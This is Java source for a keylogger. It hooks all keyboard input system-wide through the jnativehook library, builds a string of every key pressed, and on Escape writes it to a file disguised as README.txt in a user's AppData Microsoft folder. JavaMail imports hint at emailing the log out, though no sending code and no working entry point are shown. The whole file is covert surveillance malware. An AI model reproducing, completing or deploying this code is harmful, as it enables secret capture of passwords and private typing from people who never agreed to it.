import java.awt.Frame;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowEvent;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JFrame;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger extends JFrame implements ActionListener, NativeKeyListener
{
	public static File file = new File("C:\\Users\\lwelk\\AppData\\Local\\Microsoft\\README.txt");
	public static String sent = "";
	
	public KeyLogger() 
	{
		
	}

	public static void main(String[] args)
	{
		
	}
	
	public void KEY()
	{
		try  
		{
			GlobalScreen.registerNativeHook();
		} 
		catch (NativeHookException e1) 
		{
			e1.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
	
	public void nativeKeyPressed(NativeKeyEvent e)
	{	
		if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Escape")) 
		{
			sent = sent + "";
			try 
			{
				Writer(sent);
			} 
			catch (FileNotFoundException e1) 
			{
				e1.printStackTrace();
			}
			
			System.exit(0);
		} 
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space")) 
		{
			sent = sent + " ";
		} 
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Enter")) 
		{
			sent = sent + "";
		} 
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Comma")) 
		{
			sent = sent + ",";
		} 
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Semicolon")) 
		{
			sent = sent + ":";
		} 
		else 
		{
			sent = sent + NativeKeyEvent.getKeyText(e.getKeyCode());
		}
		
		
	}
	public void Writer(String str) throws FileNotFoundException
	{
		PrintWriter pw = new PrintWriter(file);
		pw.print(str);
		pw.flush();
		pw.close();
	}
	
	public void nativeKeyReleased(NativeKeyEvent e)
	{
		
	}
	
	public void nativeKeyTyped(NativeKeyEvent e)
	{
		
	}

	

	@Override
	public void actionPerformed(ActionEvent e) 
	{
		
	}

}
